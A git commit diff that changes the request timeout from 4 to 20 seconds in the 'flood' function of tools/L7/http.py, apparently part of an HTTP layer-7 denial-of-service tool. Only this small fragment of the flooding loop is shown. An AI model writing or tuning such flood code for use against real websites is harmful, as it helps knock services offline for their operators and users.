4822d565a5cc5d6a22feff0d5f95b6ee5e9c3f0b
caipenpen <66503739+caipenpen@users.noreply.github.com>
2020-07-07 18:51:43 +0700

    Update http.py

--- tools/L7/http.py
+++ tools/L7/http.py
@@ -27,9 +27,9 @@ def flood(target,domainname,attack):
     
     try:
         if attack =='get':
-            r = requests.get(target, params=payload, headers=headers, timeout=4)
+            r = requests.get(target, params=payload, headers=headers, timeout=20)
         else:
-            r = requests.post(target,params=payload ,headers=headers, timeout=4)
+            r = requests.post(target,params=payload ,headers=headers, timeout=20)
     except requests.exceptions.ConnectTimeout:
         print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out{Fore.RESET}")
     except Exception as e:
